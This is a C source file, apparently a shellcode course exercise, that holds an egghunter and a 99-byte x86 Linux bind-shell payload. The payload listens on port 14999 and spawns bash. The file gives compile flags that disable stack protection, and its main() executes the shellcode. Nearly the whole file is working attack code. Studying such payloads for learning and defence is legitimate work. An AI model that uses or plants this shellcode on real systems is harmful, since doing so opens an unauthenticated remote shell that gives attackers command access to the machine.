#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Author: Chase Hatch SLAE-1149
// gcc execute_this.c -o execute_this.elf -fno-stack-protector -z execstack
// based on http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

char egghunter[] =\
"\xfc\x31\xc9\x66\x81\xc9\xff\x0f\x41"
"\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1"
"\xb8"			// mov eax, 
"\x5a\x4f\x4e\x47"	// "ZONG" egg
"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7"; // 33 bytes egghunter, "ZONG"

char shellcode[] =\
"ZONG"
"ZONG"
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xff\x31\xf6\xb0\x66\xb3\x01"
"\x57\x53\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x5b\x57\x66\x68\x3a"
"\x97\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
"\x04\x57\x56\x89\xe1\xcd\x80\xb0\x66\xfe\xc3\x57\x56\x89\xe1\xcd"
"\x80\x93\x89\xf9\xb1\x03\xb0\x3f\x49\xcd\x80\x75\xf9\xb0\x0b\x57"
"\x68\x62\x61\x73\x68\x68\x6e\x2f\x2f\x2f\x68\x2f\x2f\x62\x69\x89"
"\xe3\xcd\x80"; 	// 99 bytes bind shell 0.0.0.0:14999, 
			// SLAE-1149 0x1 Bind Shell

int main(int argc, char **argv[]){
	printf("char egghunter[]=%s\n", egghunter);
	printf("char shellcode[]=%s\n", shellcode);
	printf("len: %d\n", strlen(egghunter));
	(* (int (*)())egghunter)();
}

